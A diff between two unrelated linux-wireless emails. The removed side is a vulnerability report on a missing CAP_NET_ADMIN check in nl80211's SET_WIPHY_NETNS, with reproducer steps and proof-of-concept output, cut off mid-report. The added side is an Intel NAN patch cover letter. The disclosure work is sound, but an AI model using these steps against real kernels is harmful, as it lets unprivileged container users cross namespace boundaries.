@@ -1,584 +1,168 @@
-Return-Path: <linux-wireless+bounces-35779-lists+linux-wireless=lfdr.de@vger.kernel.org>
+Return-Path: <linux-wireless+bounces-35780-lists+linux-wireless=lfdr.de@vger.kernel.org>
 Delivered-To: lists+linux-wireless@lfdr.de
 Received: from mail.lfdr.de
 	by lfdr with LMTP
-	id Jj6hD1Hx9mk/agIAu9opvQ
-	(envelope-from <linux-wireless+bounces-35779-lists+linux-wireless=lfdr.de@vger.kernel.org>)
-	for <lists+linux-wireless@lfdr.de>; Sun, 03 May 2026 08:55:13 +0200
+	id 8RlOI3AO92mQbgIAu9opvQ
+	(envelope-from <linux-wireless+bounces-35780-lists+linux-wireless=lfdr.de@vger.kernel.org>)
+	for <lists+linux-wireless@lfdr.de>; Sun, 03 May 2026 10:59:28 +0200
 X-Original-To: lists+linux-wireless@lfdr.de
-Received: from sea.lore.kernel.org (sea.lore.kernel.org [172.234.253.10])
-	by mail.lfdr.de (Postfix) with ESMTPS id 2CAA44B4A4C
-	for <lists+linux-wireless@lfdr.de>; Sun, 03 May 2026 08:55:11 +0200 (CEST)
+Received: from sea.lore.kernel.org (sea.lore.kernel.org [IPv6:2600:3c0a:e001:db::12fc:5321])
+	by mail.lfdr.de (Postfix) with ESMTPS id D89034B4FFD
+	for <lists+linux-wireless@lfdr.de>; Sun, 03 May 2026 10:59:27 +0200 (CEST)
 Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
-	by sea.lore.kernel.org (Postfix) with ESMTP id 6A09C30075F7
-	for <lists+linux-wireless@lfdr.de>; Sun,  3 May 2026 06:55:10 +0000 (UTC)
+	by sea.lore.kernel.org (Postfix) with ESMTP id 5D31030087B4
+	for <lists+linux-wireless@lfdr.de>; Sun,  3 May 2026 08:59:26 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id 94E7D340281;
-	Sun,  3 May 2026 06:55:09 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id D952C3AE6F3;
+	Sun,  3 May 2026 08:59:24 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=ntu.edu.sg header.i=@ntu.edu.sg header.b="Q+SI2h8/"
+	dkim=pass (2048-bit key) header.d=intel.com header.i=@intel.com header.b="E5e1zGc/"
 X-Original-To: linux-wireless@vger.kernel.org
-Received: from TYPPR03CU001.outbound.protection.outlook.com (mail-japaneastazon11012049.outbound.protection.outlook.com [52.101.126.49])
+Received: from mgamail.intel.com (mgamail.intel.com [192.198.163.9])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D69E011CBA;
-	Sun,  3 May 2026 06:55:03 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=fail smtp.client-ip=52.101.126.49
-ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1777791309; cv=fail; b=U4IeBpYEmFEV3MBJNDIFqTYlF13p+VXdO8rCBfmv/i/yOAxa7+gQtdEmI3qxrTF8ZsRihQ1v15GxUXJiT4wsYUBkQ8I9HgbVVfkbsF6vyWUI3sqXj5MSUmctDA5ZOBbejntzRWl+GIvbGFixzXJD/QWjcE6dTppgv0RdY6R1xqI=
-ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1777791309; c=relaxed/simple;
-	bh=x08hbIt/mlP1A/KdF+so8u9c63Xn6E7YY3Fkwm2FDBw=;
-	h=From:To:CC:Subject:Date:Message-ID:Content-Type:MIME-Version; b=aCbVxd9SPNE1IKxR8jXkCx5OCfjoU4vfVghiAC3hpkGMIq3uWekTus4/fvmWYD+HDGrc9PXgszOTUPn6g35+aIpmoGEWX0xp/8Gy2yWq/hf1CPqJBlh2i7UlvZFTnH01ZB2x3AlC1EugdQz/7HxVm/ZrNQ8nDIQLmOiye9vpkYE=
-ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=ntu.edu.sg; spf=pass smtp.mailfrom=ntu.edu.sg; dkim=pass (2048-bit key) header.d=ntu.edu.sg header.i=@ntu.edu.sg header.b=Q+SI2h8/; arc=fail smtp.client-ip=52.101.126.49
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=ntu.edu.sg
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=ntu.edu.sg
-ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
- b=ERlRRxMYhS4mXWoOeap3htPTrZZUOF7VHoA8KTDH1PbpM6Ab4a4lAQq4/e/KrMdgoJhRt6Oio1N00iHrKYTGG3BBXi1uU/+dgIMpdIfoUcIuH5yyaGffw0TaipgG98cyyfDrodsLraM4vViQFZEmBuUd5t3CD4s7yJwvwOR9Mpe9J0P5D1FqB4Q1k9cVPKNFYblIpeR5B7rRKE8pF904Ivl/gBpNnBUVTu3l80cjErDbfrdwlkk6K8pbyfHbVbBeksIy0iv471rUoBUUdv30jz1Eh8Kvb+UhAmOd8kg34aiu/3+sYgjUENds+5+5ExgOTS1B465/jii4p2ZGndgRAQ==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
- s=arcselector10001;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
- bh=XBNLzRtH0L971pbo9ElGL9ifDPdF/oIxei4wyLk2CrY=;
- b=yxQFBlucJ6Fdk/xFhX/F14OczykWBTYyY0138YaEHIn2OayZF5X5VyM06iQW1ZxAWxZg3pRW7iOS4fNnUWpvseBYffQW4BHMoP5JI0FUZAFkIiAJ67wIUIMLH0nWfYYin8SFLnAYeW1C4EexKKDFYOEU/e97DNWyWTOOe5ND9Nyqhr5L1jn85vmbB7XAAZQfLQUSo/UxvDolqM9WM23szpaH6Pz2wmur489AWEI7RF4DMVw4g9XTGK2MFdJajepkatrXN/UDc30AYOyVMe684FnvsjNLiZT4tKxmk5xNXi3lAZdsaf5pebTt3GYX+mdw9Kdkna9wKzMNmmUYSXcOVg==
-ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
- smtp.mailfrom=ntu.edu.sg; dmarc=pass action=none header.from=ntu.edu.sg;
- dkim=pass header.d=ntu.edu.sg; arc=none
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=ntu.edu.sg;
- s=selector1;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
- bh=XBNLzRtH0L971pbo9ElGL9ifDPdF/oIxei4wyLk2CrY=;
- b=Q+SI2h8/z23RaMDUmDM7OxBxImpWYxCwu4JvZ6WuYlPbq0Zu2MlJNNv5Wf/nfF5H6OG/+r/W8nhqZLui/0yHMTRw6tA35VyQ4DZR7/6xxcs0NFXY69nbpfejVHGo8htDFy7hUyZqyaIxJcMPOzhObkLsYOxE+RBbiKjB98h6ORtIWhgxwkCu0Gpmu+UI0oDoK9nWP8FR6olB7F7wDwEyAd/7OZAvpBqLSMTSzQU0ZTww23+my5fgbdPCR0QGtzyKpHAesjKGbSG8Z8D6s24qGZN0XR0MBPj3/KSB88XWuuyvw288lyeXBr9RrH8L8UVy4HUBB8MvR1DhHnWe556wfw==
-Received: from TYZPR01MB6758.apcprd01.prod.exchangelabs.com
- (2603:1096:405:a2::6) by SEYPR01MB4149.apcprd01.prod.exchangelabs.com
- (2603:1096:101:51::9) with Microsoft SMTP Server (version=TLS1_2,
- cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.9870.24; Sun, 3 May
- 2026 06:55:00 +0000
-Received: from TYZPR01MB6758.apcprd01.prod.exchangelabs.com
- ([fe80::bbb1:1ecd:fe69:9743]) by TYZPR01MB6758.apcprd01.prod.exchangelabs.com
- ([fe80::bbb1:1ecd:fe69:9743%6]) with mapi id 15.20.9870.022; Sun, 3 May 2026
- 06:55:00 +0000
-From: Xie Maoyi <maoyi.xie@ntu.edu.sg>
-To: "johannes@sipsolutions.net" <johannes@sipsolutions.net>
-CC: "linux-wireless@vger.kernel.org" <linux-wireless@vger.kernel.org>,
-	"linux-kernel@vger.kernel.org" <linux-kernel@vger.kernel.org>
-Subject: nl80211: SET_WIPHY_NETNS does not check caller's CAP_NET_ADMIN  over
- the target netns
-Thread-Topic: nl80211: SET_WIPHY_NETNS does not check caller's CAP_NET_ADMIN
-  over the target netns
-Thread-Index: AQHc2sfEDoUrMnJQYES6zpBNK7u1eg==
-Date: Sun, 3 May 2026 06:55:00 +0000
-Message-ID:
- <TYZPR01MB6758FE8FDBB58A6CAA4DC6BBDC302@TYZPR01MB6758.apcprd01.prod.exchangelabs.com>
-Accept-Language: en-GB, en-US
-Content-Language: en-GB
-X-MS-Has-Attach: yes
-X-MS-TNEF-Correlator:
-msip_labels:
-authentication-results: dkim=none (message not signed)
- header.d=none;dmarc=none action=none header.from=ntu.edu.sg;
-x-ms-publictraffictype: Email
-x-ms-traffictypediagnostic: TYZPR01MB6758:EE_|SEYPR01MB4149:EE_
-x-ms-office365-filtering-correlation-id: 4770bd5f-097e-4712-50f1-08dea8e0e54b
-x-o365: NTU-OFF365
-x-ms-exchange-senderadcheck: 1
-x-ms-exchange-antispam-relay: 0
-x-microsoft-antispam:
- BCL:0;ARA:13230040|1800799024|366016|786006|376014|6049299003|18002099003|56012099003|4053099003|38070700021;
-x-microsoft-antispam-message-info:
- dC9p7HKicf0x9vvfnoy8DOYIoywOflhmekyvPVeKxrasQwfhvpkPs5+S8OVdm1MPMD/a/4JLynJGx9RimOgiJ3Augeq0E6jL/KH51M5Q/hShUOWiEtrv0+tL1PcjuRtCHSRosIAVshOjc1+aLCitUL76ouWUSqlAuzr38KT9DapQZCkKL2wn05K3MYeYIvhIEJsm8/19B2oU2GWo4/Wvu0XpqqTvbz3SfX9T+BHywFcN4egLVdbqPyzsnB2uIJJijEGQlwpqnTpySmvq+eUOpzFJzuUzHCdtHXzcBWQeG/LtCEFHPx1dRO02RvkIcCtnMwrirVvDtEtgiZ8iu63t3xm7sPzvYJhvyU3DEc7TIr9t50v/RxDdRv3O761J8Mpuxhjvv1sHHBa5/LK/wcjRU6SlYymncvGV99wrYaOvX3TjINAoIjk8NGvJuoIggG/SvA/b8NwKQ+/lpOENlhaGwtGWANyydDltNmdga09zKQHlWjKWT3MwQS0luRB9+4WsWxoNUKyyvNP2gNuBZN49VXGq3HK1AKhci663pq6cEsBU+D4fnYU2tPkZFnwhlqKoM5RNcgFM4YAp98Jfu4jNBt2n27Fe1nRqwoUxzoTolhMiTbstEa2+ghArrkXG2eaAypwq31lMfeKHkiJCP3jmTHpLD+yJx9/WIVWAu0YZfVgtKNQQZRNbmbL3LCO/Arpz8Q8FtveYX791nZuYgOZwkQ==
-x-forefront-antispam-report:
- CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:TYZPR01MB6758.apcprd01.prod.exchangelabs.com;PTR:;CAT:NONE;SFS:(13230040)(1800799024)(366016)(786006)(376014)(6049299003)(18002099003)(56012099003)(4053099003)(38070700021);DIR:OUT;SFP:1101;
-x-ms-exchange-antispam-messagedata-chunkcount: 1
-x-ms-exchange-antispam-messagedata-0:
- =?iso-8859-1?Q?hPJ7b8xWBzNh6NCj4vCq0Y7xNs9QMwc0tlgpDJ6xVxsSASXJOCviDyY4qD?=
- =?iso-8859-1?Q?l+LG0ZCs0kgTm84cp/DyQ/bck+B30VLHm2pay6zFGE/1ruj2eD94DKXJxD?=
- =?iso-8859-1?Q?kkEa5i4h1M02GGFvVqkKemegNyaAoHSPCzMlE0S7NiHx3a0TVulJm6Lg+L?=
- =?iso-8859-1?Q?QYLg9fAT7PfV9OAnG/GQvioalxReBKzQ76mDfPcXtVf2nSJ00k/l/qarT1?=
- =?iso-8859-1?Q?Ms0WvsfOkVl8/F1EMEhQRngOD0WEvlD8EtePW+9C/Pxf8hspmJ+IL2ceP6?=
- =?iso-8859-1?Q?iWtXlL2F4Uu7K9GKlssgrPW36IIytbUg8daWPRdkwAt3GetzNRSuqJwgCV?=
- =?iso-8859-1?Q?MS8xMAsj94zxV6HuGKuaJL9w/8fQuL4b5Qod0/Ay0cc5SUj3NJrrddv5Zz?=
- =?iso-8859-1?Q?fwO72W8I1eVsrFyteUXy5B+7Kuvfw3YODgkTnceExaFycAbASgaNok0P/n?=
- =?iso-8859-1?Q?UuBagXHL63B+4BtYUuWvSITgk0QBR2A3arU/24ieWrgEZ9DHANTpNoJTPQ?=
- =?iso-8859-1?Q?XOSsXUri4C2QaWVcrBTfT3NPhkzVI+5G/+MTXuyts+z2hQ5EA3mhLthegH?=
- =?iso-8859-1?Q?ISLJTzOwF9/mwAj9kvBxFHvy+IV1a1fTLlay53kz6THThdnQQFxsVrQ3HO?=
- =?iso-8859-1?Q?h5/bLCByEDLGTTFXKg5a8jlHu28sV+OkDEwDXMZ+3rcjO0hJ7BAZq3NIwE?=
- =?iso-8859-1?Q?4w5JEvIXIZENLyAi1hQAnFAMlMKvC7SyU7+kX6A5TBk1mSwxAzsZ5m036o?=
- =?iso-8859-1?Q?h+q7TzUaNSdymXrkRzZ9gqhycw4nbDGYue6Dn0AmYRStIr+RxkcfSlfIjv?=
- =?iso-8859-1?Q?B6/Oo3JNQ0JPHfnmcJX5wQQP3400QLoV2IvNlF2v19oSyigmreB/NNFzyi?=
- =?iso-8859-1?Q?P/fZ1izI9ManAWUKfVCZiLRPGiyMEHtd0lgAd92+CXuNlQCoJ07eG9pbfw?=
- =?iso-8859-1?Q?zj6Ek/ozuOWdYo/qp1QdZrRrLDgZHT5aq92oEIqW0XAtnaocTO/jOqdJQN?=
- =?iso-8859-1?Q?WtvwtGMt9QxaaY9CgxsrDPQZiDbtJrb7q7YdBzLlAmNpapEeL00L19N7Jz?=
- =?iso-8859-1?Q?31GdLVGP/yQqPpOzeES8ANKv87nj2vTcX/7g+nzR2d5tynESCiB5YHoTiV?=
- =?iso-8859-1?Q?HErXkeWOjJmLy7N4MalG8UlqfZlgHJpe6obB+X9EhTfIgMZFnQFX8v8QdO?=
- =?iso-8859-1?Q?szMD6+48fPOtFROxUVIwPJKXHgRKD9ScpXTbwHcUg0PoptfzXbIuMT5tJB?=
- =?iso-8859-1?Q?ujSWAi+B1uaUHwbQCCEURoJFYsvEL1xW+RsUz+nHL39XJX/oFOGz+ecZu+?=
- =?iso-8859-1?Q?LRf95Csi0hsUPIiwTR/4j9Zj4mI0kr4/qt86ePka/d26QVslIIdXHC7cH9?=
- =?iso-8859-1?Q?HL06Wh1jXUjqU99LvZmaXHNsNvBCUODKgRXMceezwbzErAVkw2vBk5/7yO?=
- =?iso-8859-1?Q?P0jrJ+Lfh3m17S4RzbmfidSSO30cJBl2f7nS8M1TEVk2cJBj44UMjJev+P?=
- =?iso-8859-1?Q?9lO/xC3VD0w9d2IE2bzPO0qsxxwkHEtpwZzYVkVZucV9eh/2aHmg6XLryH?=
- =?iso-8859-1?Q?Yvwm7GrsZTVtM17mjdh3pkQdR4H77uBzqj03SRXzoRnyzYwvp807E1o33F?=
- =?iso-8859-1?Q?NoLnhzYedS8t1wcXI3bQs5qn3lBtRIxA1YfFebG0snOSuCR6Xh0ptvOrQJ?=
- =?iso-8859-1?Q?2L4Yye1xNRWzB64nLVjKT3bcWcURmuTttXKPN5jobnQuMb8GstRll8KHDw?=
- =?iso-8859-1?Q?r6+lDTqqA0PSE0Ys9QFHb63gKW20dLJEzcNsBuXrdGsCf5fGHQJgF7myhz?=
- =?iso-8859-1?Q?HKEsLlLZydfo0CzP/w06Neets1j38uU=3D?=
-Content-Type: multipart/mixed;
-	boundary="_004_TYZPR01MB6758FE8FDBB58A6CAA4DC6BBDC302TYZPR01MB6758apcp_"
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D7DA33AE18F
+	for <linux-wireless@vger.kernel.org>; Sun,  3 May 2026 08:59:21 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=192.198.163.9
+ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1777798764; cv=none; b=er9RqrvRQmWjB/suLwQ83i6Ot1pFGk5IXhAOroIBEmIBvfTjEPu9BbRThnn2d6l644fqlGvQDeJ8ernvQolXuaW8gXtXS/SThZfv3biCHIwUnPFDkmykxgm49EqUjWPebD45VC/Mgjq0xtEZMHuW8wlXl9fUoWQap4vc5JAC4fM=
+ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1777798764; c=relaxed/simple;
+	bh=aLf+dyIt2muoas3cgrkUbT++iiv80YmHz7r4WlhPkSU=;
+	h=From:To:Subject:Date:Message-Id:MIME-Version; b=FQYEVe+M6Q8S5SdgwtzlqtElKllsVCqs/xr1mg7UZD6l24yJJZRhtaambPJDaj5XJWbOI2rYMlEU9eqEI5TMrhVvKmCiof7RqLnw2etLpnFYbCXzatMAHFwI1LOihjyPFX3CcMdOZ98vFl22/Oy/hMDIxgp5ocWIT5KNw7Q/14g=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=intel.com; spf=pass smtp.mailfrom=intel.com; dkim=pass (2048-bit key) header.d=intel.com header.i=@intel.com header.b=E5e1zGc/; arc=none smtp.client-ip=192.198.163.9
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=intel.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=intel.com
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
+  d=intel.com; i=@intel.com; q=dns/txt; s=Intel;
+  t=1777798762; x=1809334762;
+  h=from:to:subject:date:message-id:mime-version:
+   content-transfer-encoding;
+  bh=aLf+dyIt2muoas3cgrkUbT++iiv80YmHz7r4WlhPkSU=;
+  b=E5e1zGc/HUinAOY2qwc47YyBHdDYFsJOUnM7lYDnN1jDfzlNGNuMaymQ
+   qz5twt0Pqn+9/WIChlOXJ8SzkHpjm1huicKinLMGOVof14xl2QAdQN+NJ
+   G0T8LNWCCtx2CEIu9lt7FRyrqJT8KrliuK2HA7YKHd9ddSlr0cAJSMrfL
+   AK0BBjPHqR933hv5bjZBdTqM1XbNErHxMxIpzD5l0Y14hFWxHlELJvBVI
+   8ZJYL9eQ2ptLNhrtIuqGqzObxVrzkkmRzGUd8yjOLmSz6Y8SpTmlL2Llr
+   5CfaSDizxd/e0MKoS5GvzQ+Dw2gaVgMgCguccLc+ZPelScDhHtqxpL5MA
+   Q==;
+X-CSE-ConnectionGUID: 4WeJbFoVTfiVQahmTZW1qg==
+X-CSE-MsgGUID: kws1fc4mQuaThL2Xt10Isg==
+X-IronPort-AV: E=McAfee;i="6800,10657,11774"; a="89380321"
+X-IronPort-AV: E=Sophos;i="6.23,213,1770624000"; 
+   d="scan'208";a="89380321"
+Received: from orviesa008.jf.intel.com ([10.64.159.148])
+  by fmvoesa103.fm.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 03 May 2026 01:59:21 -0700
+X-CSE-ConnectionGUID: quntajmLQKWCGnXCo0DDnA==
+X-CSE-MsgGUID: 2lvk43FAQISuErKHGTH3Iw==
+X-ExtLoop1: 1
+X-IronPort-AV: E=Sophos;i="6.23,213,1770624000"; 
+   d="scan'208";a="235123735"
+Received: from weis0040.iil.intel.com ([10.12.217.108])
+  by orviesa008-auth.jf.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 03 May 2026 01:59:20 -0700
+From: Miri Korenblit <miriam.rachel.korenblit@intel.com>
+To: linux-wireless@vger.kernel.org
+Subject: [PATCH v3 wireless-next 00/15] wifi: mac80211: more NAN patches
+Date: Sun,  3 May 2026 11:58:52 +0300
+Message-Id: <20260503085907.257378-1-miriam.rachel.korenblit@intel.com>
+X-Mailer: git-send-email 2.34.1
 Precedence: bulk
 X-Mailing-List: linux-wireless@vger.kernel.org
 List-Id: <linux-wireless.vger.kernel.org>
 List-Subscribe: <mailto:linux-wireless+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-wireless+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-X-OriginatorOrg: ntu.edu.sg
-X-MS-Exchange-CrossTenant-AuthAs: Internal
-X-MS-Exchange-CrossTenant-AuthSource: TYZPR01MB6758.apcprd01.prod.exchangelabs.com
-X-MS-Exchange-CrossTenant-Network-Message-Id: 4770bd5f-097e-4712-50f1-08dea8e0e54b
-X-MS-Exchange-CrossTenant-originalarrivaltime: 03 May 2026 06:55:00.6005
- (UTC)
-X-MS-Exchange-CrossTenant-fromentityheader: Hosted
-X-MS-Exchange-CrossTenant-id: 15ce9348-be2a-462b-8fc0-e1765a9b204a
-X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
-X-MS-Exchange-CrossTenant-userprincipalname: rjJGygbZy6266IbIBv1wbdQxUF0sa94Sf2S7TWhiFo9To/xl/PXLYVhOKBfROQhKhU4KGYbOhY0SefXIl+6uTq8BGXItM9qks41GesmrqVA=
-X-MS-Exchange-Transport-CrossTenantHeadersStamped: SEYPR01MB4149
-X-Rspamd-Queue-Id: 2CAA44B4A4C
+Organization: Intel Israel (74) Limited
+Content-Transfer-Encoding: 8bit
+X-Rspamd-Queue-Id: D89034B4FFD
 X-Rspamd-Action: no action
 X-Rspamd-Server: lfdr
-X-Spamd-Result: default: False [0.94 / 15.00];
-	MIME_BASE64_TEXT_BOGUS(1.00)[];
-	ARC_REJECT(1.00)[cv is fail on i=2];
-	DMARC_POLICY_ALLOW(-0.50)[ntu.edu.sg,quarantine];
-	R_SPF_ALLOW(-0.20)[+ip4:172.234.253.10:c];
-	R_DKIM_ALLOW(-0.20)[ntu.edu.sg:s=selector1];
+X-Spamd-Result: default: False [-0.66 / 15.00];
+	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
+	MID_CONTAINS_FROM(1.00)[];
+	DMARC_POLICY_ALLOW(-0.50)[intel.com,none];
+	R_MISSING_CHARSET(0.50)[];
+	R_DKIM_ALLOW(-0.20)[intel.com:s=Intel];
+	R_SPF_ALLOW(-0.20)[+ip6:2600:3c0a:e001:db::/64:c];
 	MAILLIST(-0.15)[generic];
-	MIME_BASE64_TEXT(0.10)[];
-	MIME_GOOD(-0.10)[multipart/mixed,text/plain];
+	MIME_GOOD(-0.10)[text/plain];
 	HAS_LIST_UNSUB(-0.01)[];
-	FORGED_SENDER_MAILLIST(0.00)[];
-	TAGGED_FROM(0.00)[bounces-35779-lists,linux-wireless=lfdr.de];
-	FORGED_RECIPIENTS_MAILLIST(0.00)[];
-	TO_DN_EQ_ADDR_ALL(0.00)[];
+	FROM_NEQ_ENVFROM(0.00)[miriam.rachel.korenblit@intel.com,linux-wireless@vger.kernel.org];
+	TAGGED_FROM(0.00)[bounces-35780-lists,linux-wireless=lfdr.de];
 	RCVD_TLS_LAST(0.00)[];
 	FROM_HAS_DN(0.00)[];
-	DKIM_TRACE(0.00)[ntu.edu.sg:+];
-	MIME_TRACE(0.00)[0:+,1:+,2:~,3:~,4:+];
-	RCVD_COUNT_FIVE(0.00)[5];
+	HAS_ORG_HEADER(0.00)[];
 	PRECEDENCE_BULK(0.00)[];
-	FROM_NEQ_ENVFROM(0.00)[maoyi.xie@ntu.edu.sg,linux-wireless@vger.kernel.org];
-	HAS_ATTACHMENT(0.00)[];
-	NEURAL_HAM(-0.00)[-1.000];
-	ASN(0.00)[asn:63949, ipnet:172.234.224.0/19, country:SG];
+	MIME_TRACE(0.00)[0:+];
+	DKIM_TRACE(0.00)[intel.com:+];
+	FORGED_RECIPIENTS_MAILLIST(0.00)[];
+	ASN(0.00)[asn:63949, ipnet:2600:3c0a::/32, country:SG];
 	TAGGED_RCPT(0.00)[linux-wireless];
-	RCPT_COUNT_THREE(0.00)[3];
-	MISSING_XM_UA(0.00)[];
-	DBL_BLOCKED_OPENRESOLVER(0.00)[sea.lore.kernel.org:helo,sea.lore.kernel.org:rdns,TYZPR01MB6758.apcprd01.prod.exchangelabs.com:mid,ntu.edu.sg:dkim]
+	NEURAL_HAM(-0.00)[-0.946];
+	TO_DN_NONE(0.00)[];
+	FORGED_SENDER_MAILLIST(0.00)[];
+	RCVD_COUNT_FIVE(0.00)[5];
+	RCPT_COUNT_ONE(0.00)[1];
+	DBL_BLOCKED_OPENRESOLVER(0.00)[intel.com:dkim,intel.com:mid]
 
---_004_TYZPR01MB6758FE8FDBB58A6CAA4DC6BBDC302TYZPR01MB6758apcp_
-Content-Type: text/plain; charset="iso-8859-1"
-Content-Transfer-Encoding: quoted-printable
+Hi,
+This series adds a few more NAN features to mac80211 and mainly hwsim
+support.
 
-Hi Johannes,
+Thanks,
+Miri
+---
 
-I think I have found two related namespace handling gaps in nl80211 on v7.0=
- mainline. I would appreciate your view on whether they are bugs and whethe=
-r they are worth fixing. The second one is much narrower than the first.
+Andrei Otcheretianski (1):
+  wifi: mac80211: Fix a kernel panic in ieee80211_encrypt_tx_skb()
 
-Bug A: NL80211_CMD_SET_WIPHY_NETNS does not check the target netns.
+Avraham Stern (1):
+  wifi: mac80211: accept protected frames for NAN device
 
-nl80211_wiphy_netns() is around line 13538 in net/wireless/nl80211.c. It re=
-solves the target netns from NL80211_ATTR_PID or NL80211_ATTR_NETNS_FD. It =
-then calls cfg80211_switch_netns() right away. The genl op flag GENL_UNS_AD=
-MIN_PERM only checks CAP_NET_ADMIN over the caller's own user namespace. Th=
-ere is no check against the target netns.
+Benjamin Berg (8):
+  wifi: mac80211_hwsim: remove unused nan_vif struct member
+  wifi: mac80211_hwsim: move NAN related variables into a struct
+  wifi: mac80211_hwsim: split NAN handling into separate file
+  wifi: mac80211_hwsim: rename and switch simulation time to boottime
+  wifi: mac80211_hwsim: move timestamp writing later in the datapath
+  wifi: mac80211_hwsim: register beacon timer by calculating TBTT
+  wifi: mac80211_hwsim: refactor NAN timer handling
+  wifi: mac80211_hwsim: switch to use TXQs
 
-By comparison, net/core/rtnetlink.c::rtnl_get_net_ns_capable() spells out t=
-he convention:
+Ilan Peer (2):
+  wifi: mac80211: allow userspace TX/RX over NAN Data interfaces
+  wifi: mac80211: Allow setting MAC address on interface creation
 
-    /* For now, the caller is required to have CAP_NET_ADMIN in
-     * the user namespace owning the target net ns. */
-    if (!sk_ns_capable(sk, net->user_ns, CAP_NET_ADMIN))
-        return ERR_PTR(-EACCES);
+Miri Korenblit (3):
+  wifi: mac80211: track the id of the NAN cluster we joined
+  wifi: mac80211: avoid out-of-bounds access in monitor
+  wifi: mac80211: add NAN channel evacuation support
 
-So a caller that has CAP_NET_ADMIN only in their own user namespace can pus=
-h a wiphy into any netns whose fd or pid they can resolve. This includes in=
-it_net. The wiphy must have WIPHY_FLAG_NETNS_OK set. That flag is set by ma=
-c80211_hwsim. It is also set on any wiphy that an administrator has delegat=
-ed into a container.
+ MAINTAINERS                                   |   2 +-
+ drivers/net/wireless/virtual/Makefile         |   2 +
+ .../net/wireless/virtual/mac80211_hwsim_i.h   | 139 +++++
+ ...mac80211_hwsim.c => mac80211_hwsim_main.c} | 508 +++++-------------
+ .../net/wireless/virtual/mac80211_hwsim_nan.c | 233 ++++++++
+ .../net/wireless/virtual/mac80211_hwsim_nan.h |  36 ++
+ include/net/mac80211.h                        |  29 +
+ net/mac80211/cfg.c                            |  19 +
+ net/mac80211/chan.c                           |  28 +-
+ net/mac80211/iface.c                          |   7 +-
+ net/mac80211/main.c                           |   4 +
+ net/mac80211/nan.c                            | 126 +++++
+ net/mac80211/offchannel.c                     |   9 +-
+ net/mac80211/rx.c                             |  26 +-
+ net/mac80211/status.c                         |   9 +-
+ net/mac80211/tx.c                             |  18 +-
+ 16 files changed, 786 insertions(+), 409 deletions(-)
+ create mode 100644 drivers/net/wireless/virtual/mac80211_hwsim_i.h
+ rename drivers/net/wireless/virtual/{mac80211_hwsim.c => mac80211_hwsim_main.c} (94%)
+ create mode 100644 drivers/net/wireless/virtual/mac80211_hwsim_nan.c
+ create mode 100644 drivers/net/wireless/virtual/mac80211_hwsim_nan.h
 
-Reproducer (poc_nl80211_setns.c, attached). Tested on a KASAN VM with mac80=
-211_hwsim radios=3D1 in init_net.
-
-  1. Real root in init_net spawns hwsim phyN.
-  2. fork(). Child runs unshare(CLONE_NEWUSER | CLONE_NEWNET) and writes a =
-0-mapped uid_map to become "root" in its own user_ns.
-  3. Real root migrates phyN into the child's netns. This is the legitimate=
- admin step. Container Wi-Fi delegation does the same thing.
-  4. Child issues NL80211_CMD_SET_WIPHY_NETNS with NL80211_ATTR_NETNS_FD po=
-inting at init_net's netns fd.
-  5. The kernel honours the request. phyN moves back to init_net. The calle=
-r has no CAP_NET_ADMIN in init_net.
-
-Vanilla output (poc_vanilla.log, attached):
-
-    [child] uid=3D0 netns=3Dnet:[4026532261]
-    [child] BUG: SET_WIPHY_NETNS to init_net SUCCEEDED from attacker userns=
-/netns without CAP_NET_ADMIN over init_net
-    [init_net after child finished] /sys/class/ieee80211 =3D phyN
-
-The final line shows phyN back in init_net.
-
-Bug B: nl80211_prepare_wdev_dump() continuation does not re-check netns.
-
-The first dumpit invocation validates the wdev against the caller via __cfg=
-80211_wdev_from_attrs(..., sock_net(cb->skb->sk), ...). Subsequent invocati=
